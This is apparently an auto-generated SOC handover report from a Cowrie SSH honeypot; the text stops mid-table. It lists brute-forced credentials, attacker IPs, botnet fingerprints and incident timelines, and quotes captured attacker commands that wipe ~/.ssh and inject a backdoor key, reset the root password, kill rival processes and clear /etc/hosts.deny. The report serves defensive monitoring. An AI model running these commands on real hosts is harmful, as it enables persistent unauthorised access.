# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-21 |
| **Generated At** | 2026-05-21T21:44:53Z |
| **Shift Time** | 21:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **378** |
| Confirmed Threats | **317** |
| False Positives Filtered | **61** (16.1%) |
| Unique Attacker IPs | **32** |
| Countries of Origin | **17** |
| High Severity Cases | **27** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **351** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **61** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **19** |
| Unique Passwords | **31** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `345gs5662d34` | 12 |
| `admin` | 3 |
| `a` | 2 |
| `nil` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 12 |
| `password` | 3 |
| `` | 3 |
| `admin` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 12 |
| `a` | `a` | 2 |
| `nil` | `` | 2 |
| `admin` | `admin` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qq888888` | `103.211.59.6` | 2026-05-21T20:16:05 |
| `root` | `3245gs5662d34` | `103.211.59.6` | 2026-05-21T20:16:07 |
| `root` | `123qwe!@#QWE` | `197.248.207.139` | 2026-05-21T20:19:19 |
| `root` | `3245gs5662d34` | `197.248.207.139` | 2026-05-21T20:19:24 |
| `root` | `Abcd1234` | `197.248.207.139` | 2026-05-21T20:36:24 |
| `root` | `Abc1234%` | `197.248.207.139` | 2026-05-21T20:40:49 |
| `root` | `admin` | `192.42.116.100` | 2026-05-21T20:45:09 |
| `root` | `Aa123456..` | `197.248.207.139` | 2026-05-21T20:45:16 |
| `root` | `admin000@@@` | `197.248.207.139` | 2026-05-21T20:49:50 |
| `root` | `1q@W3e$R` | `197.248.207.139` | 2026-05-21T20:54:19 |
| `root` | `yuanyuan` | `101.126.154.252` | 2026-05-21T20:57:25 |
| `root` | `1324` | `172.191.132.202` | 2026-05-21T21:05:48 |
| `root` | `Qwerty123!` | `152.52.15.214` | 2026-05-21T21:06:12 |
| `root` | `3245gs5662d34` | `152.52.15.214` | 2026-05-21T21:06:14 |
| `root` | `Abcd1234!` | `152.52.15.214` | 2026-05-21T21:26:45 |
| `root` | `asd1234567@` | `152.52.15.214` | 2026-05-21T21:30:52 |
| `root` | `Test12345` | `152.52.15.214` | 2026-05-21T21:35:01 |
| `root` | `Changeme_123` | `152.52.15.214` | 2026-05-21T21:39:13 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **378** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 55 |
| OpenSSH | 9 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 46 | 5 |
| `c118de82e19e...` | Mirai/variant | 8 | 2 |
| `03a80b21afa8...` | Modern SSH client | 7 | 1 |
| `1cc79c7da9b5...` | libssh-based | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 46 | 5 | Mirai/variant |
| `c118de82e19e...` | OpenSSH | 8 | 2 | Mirai/variant |
| `03a80b21afa8...` | libssh | 7 | 1 | Modern SSH client |
| `1cc79c7da9b5...` | OpenSSH | 1 | 1 | libssh-based |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:rco0V2zTPGL6"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `172.191.132.202`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `152.52.15.214`, `197.248.207.139`, `101.126.154.252`, `103.211.59.6`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **32** |
| Unique ASNs | **1** |
| High-Risk ASNs | **1** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 32 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (27)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ef1fde23f61c

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 20:16 |
| **Last Seen** | 2026-05-21 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:16:05` | `cowrie.session.connect` |
| `2026-05-21 20:16:05` | `cowrie.client.version` |
| `2026-05-21 20:16:05` | `cowrie.client.kex` |
| `2026-05-21 20:16:05` | `cowrie.login.success` |
| `2026-05-21 20:16:06` | `cowrie.session.params` |
| `2026-05-21 20:16:06` | `cowrie.command.input` |
| `2026-05-21 20:16:06` | `cowrie.command.failed` |
| `2026-05-21 20:16:06` | `cowrie.log.closed` |
| `2026-05-21 20:16:06` | `cowrie.session.params` |
| `2026-05-21 20:16:06` | `cowrie.command.input` |
| `2026-05-21 20:16:06` | `cowrie.session.file_download` |
| `2026-05-21 20:16:06` | `cowrie.log.closed` |
| `2026-05-21 20:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8f4f581c460

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 20:16 |
| **Last Seen** | 2026-05-21 20:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:16:07` | `cowrie.session.connect` |
| `2026-05-21 20:16:07` | `cowrie.client.version` |
| `2026-05-21 20:16:07` | `cowrie.client.kex` |
| `2026-05-21 20:16:07` | `cowrie.login.success` |
| `2026-05-21 20:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08b7c0a4b02b

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:19 |
| **Last Seen** | 2026-05-21 20:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:19:18` | `cowrie.session.connect` |
| `2026-05-21 20:19:18` | `cowrie.client.version` |
| `2026-05-21 20:19:18` | `cowrie.client.kex` |
| `2026-05-21 20:19:19` | `cowrie.login.success` |
| `2026-05-21 20:19:20` | `cowrie.session.params` |
| `2026-05-21 20:19:20` | `cowrie.command.input` |
| `2026-05-21 20:19:20` | `cowrie.command.failed` |
| `2026-05-21 20:19:20` | `cowrie.log.closed` |
| `2026-05-21 20:19:20` | `cowrie.session.params` |
| `2026-05-21 20:19:20` | `cowrie.command.input` |
| `2026-05-21 20:19:21` | `cowrie.session.file_download` |
| `2026-05-21 20:19:21` | `cowrie.log.closed` |
| `2026-05-21 20:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e75c92724ce

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:19 |
| **Last Seen** | 2026-05-21 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:19:23` | `cowrie.session.connect` |
| `2026-05-21 20:19:23` | `cowrie.client.version` |
| `2026-05-21 20:19:23` | `cowrie.client.kex` |
| `2026-05-21 20:19:24` | `cowrie.login.success` |
| `2026-05-21 20:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a4f5c3f495e

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:36 |
| **Last Seen** | 2026-05-21 20:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:36:23` | `cowrie.session.connect` |
| `2026-05-21 20:36:23` | `cowrie.client.version` |
| `2026-05-21 20:36:24` | `cowrie.client.kex` |
| `2026-05-21 20:36:24` | `cowrie.login.success` |
| `2026-05-21 20:36:25` | `cowrie.session.params` |
| `2026-05-21 20:36:25` | `cowrie.command.input` |
| `2026-05-21 20:36:25` | `cowrie.command.failed` |
| `2026-05-21 20:36:25` | `cowrie.log.closed` |
| `2026-05-21 20:36:26` | `cowrie.session.params` |
| `2026-05-21 20:36:26` | `cowrie.command.input` |
| `2026-05-21 20:36:26` | `cowrie.session.file_download` |
| `2026-05-21 20:36:26` | `cowrie.log.closed` |
| `2026-05-21 20:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d6aa403df6

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:36 |
| **Last Seen** | 2026-05-21 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:36:28` | `cowrie.session.connect` |
| `2026-05-21 20:36:28` | `cowrie.client.version` |
| `2026-05-21 20:36:29` | `cowrie.client.kex` |
| `2026-05-21 20:36:29` | `cowrie.login.success` |
| `2026-05-21 20:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eab20f750e0

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:40 |
| **Last Seen** | 2026-05-21 20:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:40:48` | `cowrie.session.connect` |
| `2026-05-21 20:40:48` | `cowrie.client.version` |
| `2026-05-21 20:40:48` | `cowrie.client.kex` |
| `2026-05-21 20:40:49` | `cowrie.login.success` |
| `2026-05-21 20:40:50` | `cowrie.session.params` |
| `2026-05-21 20:40:50` | `cowrie.command.input` |
| `2026-05-21 20:40:50` | `cowrie.command.failed` |
| `2026-05-21 20:40:50` | `cowrie.log.closed` |
| `2026-05-21 20:40:50` | `cowrie.session.params` |
| `2026-05-21 20:40:50` | `cowrie.command.input` |
| `2026-05-21 20:40:51` | `cowrie.session.file_download` |
| `2026-05-21 20:40:51` | `cowrie.log.closed` |
| `2026-05-21 20:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41b212e1003

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:40 |
| **Last Seen** | 2026-05-21 20:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:40:53` | `cowrie.session.connect` |
| `2026-05-21 20:40:53` | `cowrie.client.version` |
| `2026-05-21 20:40:54` | `cowrie.client.kex` |
| `2026-05-21 20:40:54` | `cowrie.login.success` |
| `2026-05-21 20:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0db3e1b5af13

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]100` |
| **First Seen** | 2026-05-21 20:45 |
| **Last Seen** | 2026-05-21 20:45 |
| **Session Duration** | 22s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:45:04` | `cowrie.session.connect` |
| `2026-05-21 20:45:07` | `cowrie.client.version` |
| `2026-05-21 20:45:07` | `cowrie.client.kex` |
| `2026-05-21 20:45:09` | `cowrie.client.fingerprint` |
| `2026-05-21 20:45:09` | `cowrie.login.failed` |
| `2026-05-21 20:45:09` | `cowrie.login.success` |
| `2026-05-21 20:45:26` | `cowrie.direct-tcpip.request` |
| `2026-05-21 20:45:26` | `cowrie.direct-tcpip.ja4` |
| `2026-05-21 20:45:26` | `cowrie.direct-tcpip.data` |
| `2026-05-21 20:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]100` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]100` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a37891bd1278

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:45 |
| **Last Seen** | 2026-05-21 20:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:45:15` | `cowrie.session.connect` |
| `2026-05-21 20:45:15` | `cowrie.client.version` |
| `2026-05-21 20:45:15` | `cowrie.client.kex` |
| `2026-05-21 20:45:16` | `cowrie.login.success` |
| `2026-05-21 20:45:17` | `cowrie.session.params` |
| `2026-05-21 20:45:17` | `cowrie.command.input` |
| `2026-05-21 20:45:17` | `cowrie.command.failed` |
| `2026-05-21 20:45:17` | `cowrie.log.closed` |
| `2026-05-21 20:45:17` | `cowrie.session.params` |
| `2026-05-21 20:45:17` | `cowrie.command.input` |
| `2026-05-21 20:45:17` | `cowrie.session.file_download` |
| `2026-05-21 20:45:17` | `cowrie.log.closed` |
| `2026-05-21 20:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-457c7dce4817

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:45 |
| **Last Seen** | 2026-05-21 20:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:45:20` | `cowrie.session.connect` |
| `2026-05-21 20:45:20` | `cowrie.client.version` |
| `2026-05-21 20:45:20` | `cowrie.client.kex` |
| `2026-05-21 20:45:21` | `cowrie.login.success` |
| `2026-05-21 20:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f09e1640c5dc

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:49 |
| **Last Seen** | 2026-05-21 20:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 20:49:49` | `cowrie.session.connect` |
| `2026-05-21 20:49:49` | `cowrie.client.version` |
| `2026-05-21 20:49:49` | `cowrie.client.kex` |
| `2026-05-21 20:49:50` | `cowrie.login.success` |
| `2026-05-21 20:49:51` | `cowrie.session.params` |
| `2026-05-21 20:49:51` | `cowrie.command.input` |
| `2026-05-21 20:49:51` | `cowrie.command.failed` |
| `2026-05-21 20:49:51` | `cowrie.log.closed` |
| `2026-05-21 20:49:51` | `cowrie.session.params` |
| `2026-05-21 20:49:51` | `cowrie.command.input` |
| `2026-05-21 20:49:51` | `cowrie.session.file_download` |
| `2026-05-21 20:49:51` | `cowrie.log.closed` |
| `2026-05-21 20:49:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63b93207b9db

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-21 20:49 |
| **Last Seen** | 2026-05-21 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
